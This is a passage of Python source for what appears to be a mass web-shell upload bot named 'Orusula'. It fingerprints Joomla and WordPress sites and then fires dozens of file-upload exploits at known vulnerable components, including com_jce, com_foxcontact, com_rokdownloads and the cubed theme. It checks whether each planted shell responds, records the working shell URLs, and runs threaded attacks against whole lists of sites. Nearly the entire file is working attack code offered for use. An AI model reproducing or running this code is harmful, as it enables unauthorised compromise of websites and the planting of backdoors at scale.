            "f_file":"",
            "component":""
        }

        r = s.get(url, headers=headers)

        if r.status_code == 200 and '{"filepath":null,"uri":null}' in r.text:

            rr = s.post(url, headers=headers, files=files, data=data)

            if name_php in rr.text:

                print(GREEN,"   [+] Com Fabrik", target+"/"+name_php)

                shellup = target+"/"+name_php

                save(shellup)

            else:

                print(RED,"   [-] Com Fabrik")

        else:
            print(RED,"   [-] Com Fabrik")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Com Fabrik")

# com facileforms
def com_facileforms(target, headers):
    try:
        s = requests.session()

        endpoint = target + "/components/com_facileforms/libraries/jquery/uploadify.php"

        img = open(shell_php, 'rb')

        files = {'image': img,
                'Filedata' : img
        }
        data = {
                'folder' : '/components/com_facileforms/libraries/jquery/'
        }
        s.post(endpoint, data=data, headers=headers, files=files)

        shellup = target + "/components/com_facileforms/libraries/jquery/"+name_php
        checkShell = requests.get(shellup, headers=headers, allow_redirects=False)

        ss = checkShell.text

        statusCheck = re.findall(re.compile(r'Orusula'),ss)

        if statusCheck and checkShell.status_code == 200:
            print(GREEN,"   [+] com_facileforms ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_facileforms ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_facileforms ")

# com foxcontact
def com_foxcontact(target):
    try:
        s = requests.session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'X-File-Name': 'shell.php',
            'Content-Type': 'image/jpeg',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'
        }
        endpoint = target + "/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php"
        img = open(shell_php, 'rb')
        files= {'image': img}

        s.post(endpoint,files=files, headers=headers)

        shellup = target + "/components/com_foxcontact/_func.php"

        checkShell = s.get(shellup, headers=headers).text

        statusCheck = re.findall(re.compile(r'Orusula'),checkShell)

        if statusCheck:
            print(GREEN,"   [+] com_foxcontact ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_foxcontact ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_foxcontact ")

# com_jce
def Com_Jce(target, headers):
    try:
        payload = {
            'Filedata': open(shell_gif, 'rb')
        }

        data ={
            'upload-dir' : '/',
            'upload-overwrite' : '0',
            'action' : 'upload'
        }

        Exp = target + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'

        rr = requests.post(Exp, files=payload, data=data, headers=headers)

        if "Orusula" in rr.text or rr.status_code == 200:
            PrivMethod = {
                'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + shell_php.split('/')[1]+ "\",\"./../../images/Orusula.gif\"]}"
            }

            privExploit = target + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
            requests.post(privExploit, data=PrivMethod, headers=headers)
            try:
                VulnCheck = requests.get(target+'/images/'+name_gif, headers=headers, allow_redirects=False)
                if 'Orusula' in VulnCheck.text or VulnCheck.status_code == 200:
                    print(GREEN,"   [+] Com_Jce", target + '/images/'+name_gif)

                    a = target+'/images/'+name_gif

                    save(a)

                else:
                    print(RED,"   [-] Com_Jce")
            except:
                print(RED,"   [-] Com_Jce")
        else:
            print(RED,"   [-] Com_Jce")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Com_Jce")

# com jdownloads
def com_jdownloads(target):
    print(RED,"   [-] com_jdownloads")

# com jwallpapers
def com_jwallpapers(target, headers):
    try:
        s = requests.session()

        endpoint = target + "/index.php?option=com_jwallpapers&task=upload"

        shell = open(shell_php, 'rb')

        files= {
            'file':shell
        }
        data = {
            'name':name_php,
            'submit' : 'Upload'
        }
        s.post(endpoint,data=data, headers=headers, files=files)

        shellup = target+"/jwallpapers_files/plupload/"+name_php

        checkShell = s.get(shellup, headers=headers, allow_redirects=False)

        statusCheck = re.findall(re.compile(r'Orusula'), checkShell.text)

        if checkShell.status_code == 200 and statusCheck:
            print(GREEN,"   [+] com_jwallpapers ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_jwallpapers ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_jwallpapers ")

# com media
def com_media(target, headers):
    try:
        shell = open(shell_jpg, "rb")

        url = target+"/index.php?option=com_media&view=ima­ges&tmpl=component&fieldid=&­e_name=jform_articletext&asset=com_c­ontent&author=&folder="

        files = {
            "Filedata[]":shell
        }

        headers = {
            'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
            'Content_Type' : 'multipart/form-data',
            'Connection': 'keep-alive',
        }

        data = {
            "f_url":"",
            "f_alt":"",
            "f_title":"",
            "f_caption":"",
            "dirPath":"",
            "f_file":"",
            "component":""
        }

        s = requests.session()

        r = s.get(url, headers=headers, allow_redirects=False)

        try:

            if r.status_code == 200:

                html_doc = r.text
                soup = BeautifulSoup(html_doc, 'html.parser')

                url = soup.find('form', id="uploadForm").get('action')

                url = str(url)

                rr = s.post(url, headers=headers, files=files, data=data)

                if name_jpg in rr.text:

                    print(GREEN,"   [+] Com Media", target+"/images/"+name_jpg)

                    a = target+"/images/"+name_jpg

                    save(a)

                else:

                    print(RED,"   [-] Com Media")


            else:
                print(RED,"   [-] Com Media")

        except AttributeError:
                print(RED,"   [-] Com Media")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Com Media")

# com media I
def com_media_I(target, headers):
    try:
        shell = open(shell_txt, "rb")

        url = target+"/index.php?option=com_media&view=ima­ges&tmpl=component&fieldid=&­e_name=jform_articletext&asset=com_c­ontent&author=&folder="

        files = {
            "Filedata[]":shell
        }

        headers = {
            'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
            'Content_Type' : 'multipart/form-data',
            'Connection': 'keep-alive',
        }

        data = {
            'Content_Type' : 'multipart/form-data'
        }

        s = requests.session()

        r = s.post(url, headers=headers, data=data, files=files)

        r = r

        mediaup = target+"/images/"+name_txt

        rr = s.get(mediaup, headers=headers, allow_redirects=False)

        if "Orusula" in rr.text and rr.status_code == 200:
            print(GREEN,"   [+] Com Media I ", mediaup)
            save(mediaup)

        else:
            print(RED,"   [-] Com Media I ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Com Media I ")

# cubed
def cubed(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-content/themes/cubed_v1.2/functions/upload-handler.php"

        shell = open(shell_php, "rb")

        payload = {
            "uploadfile": shell
        }

        r = s.post(url, headers=headers, files=payload)

        r = r

        scan = target+"/wp-content/uploads/"+str(year)+"/"+str(month)+"/"+name_php

        rr = s.get(url, headers=headers)

        if 'Orusula' in rr.text:
            print(GREEN,"   [+] cubed ", scan)
            save(scan)
        else:
            print(RED,"   [-] cubed ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] cubed ")

# Com Jbcatalog
def Com_Jbcatalog(target, headers):
    try:
        s = requests.session()

        url = target+"/components/com_jbcatalog/libraries/jsupload/server/php"

        shell = open(shell_php, "rb")

        payload = {
            "files[]":shell
        }

        data = {
            'Content_Type' : 'multipart/form-data'
        }

        r = s.post(url, headers=headers, files=payload, data=data)

        r = r

        scan = target+"/components/com_jbcatalog/libraries/jsupload/server/php/files/"+name_php

        rr = s.get(scan, headers=headers)

        if "Orusula" in rr.text and rr.status_code == 200:
            print(GREEN,"   [+] Com Jbcatalog ", scan)
        else:
            scan = target+"/com_jbcatalog/libraries/jsupload/server/php/files/"+name_php

            rr = s.get(scan, headers=headers)

            if "Orusula" in rr.text and rr.status_code != 404:
                print(GREEN,"   [+] Com Jbcatalog ", scan)
                save(scan)

            else:
                print(RED,"   [-] Com Jbcatalog ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Com Jbcatalog ")

# com rokdownloads
def com_rokdownloads(target, headers):
    try:
        s = requests.session()

        url = target+"/administrator/components/com_rokdownloads/assets/uploadhandler.php"
        img = open(shell_jpg, 'rb')

        payload = {
            'Filedata':img,
            'jpath':'..%2F..%2F..%2F..%2F'
        }
        data = {
            'jpath':'..%2F..%2F..%2F..%2F'
        }

        s.post(url, headers=headers, files=payload, data=data)

        scan = target+"/images/stories/"+name_jpg

        rr = s.get(scan, headers=headers)

        if rr.status_code == 200:
            print(GREEN,"   [+] com_rokdownloads ", scan)
            save(scan)
        else:
            print(RED,"   [-] com_rokdownloads ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_rokdownloads ")

# com simplefileupload
def com_simplefileupload(target, headers):
    try:
        s = requests.session()
        endpoint = target + "/modules/mod_simplefileuploadv1.3/elements/udd.php"
        img = open(shell_gif, 'rb')
        files= {'image': img,
            'file':img
        }
        data = {
            'submit':'Upload'
        }
        s.post(endpoint,files=files, headers=headers, data=data)
        shellup = target + "/modules/mod_simplefileuploadv1.3/elements/"+name_gif
        rr = requests.get(shellup, headers=headers)
        if rr.status_code == 200:
            print(GREEN,"   [+] mod_simplefileupload ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] mod_simplefileupload")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] mod_simplefileupload")

# com sexycontactform
def com_sexycontactform(target, headers):
    try:
        s = requests.session()

        endpoint = target + "/com_sexycontactform/fileupload/index.php"
        img = open(shell_php, 'rb')
        fieldname = "image[]"
        files= {'image': img}
        data = { fieldname : files }
        s.post(endpoint, data=data, headers=headers, files=files)
        shellup = target + "/com_sexycontactform/fileupload/files/files/"+name_php
        checkShell = requests.get(shellup, headers=headers)
        checkShell1 = checkShell.text
        statusCheck = re.findall(re.compile(r'Orusula'),checkShell1)

        if statusCheck and checkShell.status_code != 404:
            print(GREEN,"   [+] com_sexycontactform ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_sexycontactform ")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_sexycontactform ")


def com_sexycontactform2(target, headers):
    try:
        s = requests.session()
        url = target+"/com_sexycontactform/fileupload/index.php"

        shell = open(shell_php, 'rb')

        payload = {
            'files[]':shell
        }

        r = s.post(url, headers=headers, files=payload)

        r = r

        scan = target+"/com_sexycontactform/fileupload/files/"+name_php

        rr = s.get(scan, headers=headers)

        if 'Hacked' in rr.text and rr.status_code != 404:
            print(GREEN,"   [+] com_sexycontactform I ", scan)
            save(scan)
        else:
            print(RED,"   [-] com_sexycontactform I")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_sexycontactform I")

# com users
def com_users(target, headers):

    try:
        s = requests.session()

        endpoint = target + "/index.php?option=com_users&view=registration"
        checkShell = s.get(endpoint, headers=headers).text
        statusCheck = re.findall(re.compile(r'jform_email2-lbl'), checkShell)

        if statusCheck:
            print(GREEN,"   [+] com_users ", endpoint)
            save(endpoint)
        else:
            print(RED,"   [-] com_users ")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_users ")

# com weblinks
def com_weblinks(url,headers):
    try:
        s = requests.session()

        endpoint = url + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author="
        token = re.findall(re.compile(r'<form action=\"(.*?)" id="uploadForm\"'),endpoint)
        if token:
            url = token.group(1)
        img = open(shell_gif, 'rb')
        fieldname = "image[]"
        files= {'image': img}
        data = { fieldname : files }
        s.post(endpoint,data=data, headers=headers, files=files)
        shellup = url + "/images/"+name_gif
        checkShell = requests.get(shellup, headers=headers)
        if checkShell.status_code == 200:
            print(GREEN,"   [+] comweblinks ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] comweblinks ")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] comweblinks ")

# wordpress
def wordpress(target):
    headers = {
        'User-Agent' : choice(USER_AGENTS),
        'Content_Type' : 'multipart/form-data',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        }
    x = multiprocessing.Process(target=max_revslider, args=(target, headers,))      # T
    x.start()
    woocommerce_img(target, headers)
    x = threading.Thread(target=addblockurl, args=(target, headers,))        # T
    x.start()
    barclaycart(target, headers)
    x = threading.Thread(target=wp_blaze, args=(target, headers,))           # T
    x.start()
    downloadsmanager(target, headers)
    x = threading.Thread(target=wp_catpro, args=(target, headers,))          # T
    x.start()
    wtffu(target, headers)
    x = threading.Thread(target=dreamworkgallery, args=(target, headers,))   # T
    x.start()
    wp_powerzoomer(target, headers)
    x = threading.Thread(target=FormCraft, args=(target, headers,))          # T
    x.start()
    cubed(target, headers)
    x = threading.Thread(target=Gravity, args=(target, headers,))            # T
    x.start()
    Revslider_Ajax(target, headers)
    x = threading.Thread(target=job_manager, args=(target, headers,))        # T
    x.start()
    Revslider(target, headers)
    x = threading.Thread(target=wp_levoslideshow, args=(target, headers,))   # T
    x.start()
    WP_MOBILE_Detector(target, headers)
    x = threading.Thread(target=pinboard, args=(target, headers,))           # T
    x.start()
    satoshi(target, headers)
    x = threading.Thread(target=pitchprint, args=(target, headers,))         # T
    x.start()
    wp_showbiz(target, headers)
    x = threading.Thread(target=RightNow, args=(target, headers,))           # T
    x.start()
    synoptic(target, headers)
    x = threading.Thread(target=wysija, args=(target, headers,))             # T
    x.start()
    Cherry_Plugin(target, headers)
    x = threading.Thread(target=Simple_ads_manager, args=(target, headers,))             # T
    x.start()
    dzs_zoomsounds(target, headers)

# joomla
def joomla(target):
    target = str(target)
    headers = {
        'User-Agent' : choice(USER_AGENTS),
        'Content_Type' : 'multipart/form-data',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        }
    x = threading.Thread(target=com_adsmanager, args=(target, headers,))           # T
    x.start()
    com_blog(target, headers)
    x = threading.Thread(target=com_extplorer, args=(target, headers,))           # T
    x.start()
    com_fabrike(target, headers)
    x = threading.Thread(target=com_facileforms, args=(target, headers,))           # T
    x.start()
    com_foxcontact(target)
    x = threading.Thread(target=Com_Jce, args=(target, headers,))           # T
    x.start()
    com_jdownloads(target)
    x = threading.Thread(target=Com_Jbcatalog, args=(target, headers,))           # T
    x.start()
    com_jwallpapers(target, headers)
    x = threading.Thread(target=com_media, args=(target, headers,))           # T
    x.start()
    com_media_I(target, headers)
    x = threading.Thread(target=com_rokdownloads, args=(target, headers,))           # T
    x.start()
    com_simplefileupload(target, headers)
    x = threading.Thread(target=com_sexycontactform, args=(target, headers,))           # T
    x.start()
    com_sexycontactform2(target, headers)
    x = threading.Thread(target=com_users, args=(target, headers,))           # T
    x.start()
    com_weblinks(target, headers)

# cms scanner
def detect_cms(target, scan):
    target = target
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    try:
        content=requests.get(target, headers=headers, allow_redirects=False)
        content = content.text
    except:
        return
    try:
        #         joomla           #
        if  re.search(re.compile(r'<script type=\"text/javascript\" src=\"/media/system/js/mootools.js\"></script>|/media/system/js/|com_content|Joomla!'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " Joomla\n", RESET)
            joomla(target)

        #         wordpress         #
        elif re.search(re.compile(r'wp-content|wordpress|xmlrpc.php'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " Wordpress\n", RESET)
            if scan == True:
                pass
            else:
                wordpress(target)

        #         drupal            #
        elif re.search(re.compile(r'Drupal|drupal|sites/all|drupal.org'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " Drupal\n", RESET)

        #         Prestashop        #
        elif re.search(re.compile(r'Prestashop|prestashop'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " Prestashop\n", RESET)

        #          OpenCart        #
        elif re.search(re.compile(r'route=product|OpenCart|route=common|catalog/view/theme'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " OpenCart\n", RESET)

        #          Magento         #
        elif re.search(re.compile(r'Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento'), content):
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", GREEN, " Magento\n", RESET)

        #          Unknown         #
        else:
            print(BLUE, "\n<< ",YELLOW,target,BLUE," << ", RED, " Unknown\n", RESET)

    except requests.exceptions.ConnectionError:
        print(RED,"   [?] Error Connecting ")
    except requests.exceptions.MissingSchema:
        print(RED,"   [?] Invalid url")
    except requests.exceptions.ChunkedEncodingError:
        print(RED,"   [?] Connection broken")



def menu():
    try:
        parser = argparse.ArgumentParser(description='Orusula bot by BrahimJarrar', prog='PROG')

        parser.add_argument('-u', '--url', metavar='', help='Target site')
        parser.add_argument('-l', '--list', metavar='', help='list of sites urls')
        parser.add_argument('-d', '--dorks', metavar='', help='dorks to get sites list. Soon')
        parser.add_argument('-s', '--scan', metavar='',  help='Cms scanner')
        parser.add_argument('-t', '--threads', metavar='', help='Threading by default 10', type=int)

        args = parser.parse_args()

        if args.url:
            target = args.url
            if args.scan:
                detect_cms(target, scan=True)
            else:
                detect_cms(target, scan=False)
        else:
            if args.threads:
                Pro = args.threads
            else:
                Pro = 5
            if Pro > 15:
                Pro = 20
            else:
                Pro = 5
            if args.list:
                sites = args.list
            else:
                sites = input('\n\033[1;31m[*] enter list sites: ')
            if sites.startswith("'") or sites.startswith('"'):
                sites = sites[1:-1]
            else:
                pass
            if os.path.exists(sites):
                if platform.system().startswith("Win" or "win"):
                    os.system("cls")
                else:
                    os.system("clear")

                print(logo.banner)
                
                with open(sites, "r") as sites:
                    sites = sites.readlines()
                    for site in sites:
                        target = site.strip()
                        if target.startswith("http"):
                            pass
                        else:
                            target = "http://"+target
                        if args.scan:
                            scan = True
                            x = multiprocessing.Process(target=detect_cms, args=(target, scan,))      # T
                            x.start()
                            if x.name.endswith('0'):
                                time.sleep(1)
                            elif x.name.endswith('0'):
                                time.sleep(0.5)
                            else:
                                pass
                        else:
                            
                            scan=False

                            if args.threads:
                                x = multiprocessing.Process(target=detect_cms, args=(target, scan,))      # T
                                x.start()
                                name = x.name
                                if Pro == 20:
                                    if name.endswith('20') or name.endswith('40') or name.endswith('60') or name.endswith('80'):
                                        time.sleep(60)
                                    else:
                                        pass
                                elif Pro == 5:
                                    if name.endswith('5'):
                                        print(BLUE,'   [?] Sleep Start')
                                        time.sleep(40)
                                        print(BLUE,'   [?] Sleep End')
                                    else:
                                        pass
                                else:
                                    pass
                            else:
                                detect_cms(target, scan)
            else:
                print("{}[?]{} No Such File.".format(HEADER, BLUE))

    except KeyboardInterrupt:
        print(logo.exit)
        exit()

if __name__ == "__main__":
    print(logo.banner)
    menu()
